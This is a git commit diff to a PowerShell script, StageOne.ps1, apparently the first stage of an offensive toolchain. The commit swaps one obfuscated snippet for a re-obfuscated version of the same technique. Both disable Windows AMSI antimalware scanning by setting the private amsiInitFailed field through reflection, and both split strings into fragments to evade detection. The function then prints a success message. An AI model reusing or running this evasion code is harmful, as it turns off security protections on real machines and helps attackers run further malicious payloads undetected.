fa00978e04a599e153dd765e1a4caeefa1169417
HeeresS <48584256+HeeresS@users.noreply.github.com>
2023-04-18 13:17:53 +0200

    Update StageOne.ps1

--- StageOne.ps1
+++ StageOne.ps1
@@ -1,11 +1,7 @@
 function Invoke-StageOne {
     # Code for Stage One goes here
    
-${_1}= 'Sy'; ${_2}= 'tem.'; ${_3}= 'Man'; ${_4}= 'agem'; ${_5}= 'ent.'; ${_6}= 'Auto'; ${_7}= 'mation.'; ${_8}= 'A'; ${_9}= 'si'; ${_10}= 's'; ${_11}= 'tant'; ${_12}= 's'; ${_13}= [String]::Concat(${_1},${_3},${_2},${_4},${_5},${_6},${_7},${_8},${_9},${_10},${_11})
-${_14}= 'U'; ${_15}= 'tils'
-${_16}= [Ref].Assembly.GetType(([String]::Concat(${_13},'m',${_9},${_14},${_15})))
-${_17}= ${_16}.GetField(([String]::Concat('am',${_9},'InitFailed')),'NonPublic,Static')
-${_17}.SetValue($null,$true)
+$w='Sy'+'stem.'+'Ma'+'na'+'ge'+'ment.A'+'u';$c='si';$m='Uti'+'ls';$ass=[Ref].Assembly.GetType(('{'+'0}m{1}{2}'-f$w,$c,$m));$f=$ass.GetField(('am{0}InitFai'+'led'-f$c),'Non'+'Public,S'+'tati'+'c');$f.SetValue($null,$true)
 
     # If Stage One completes successfully, write a success message
     Write-Host "Stage One succeeded" -ForegroundColor Green
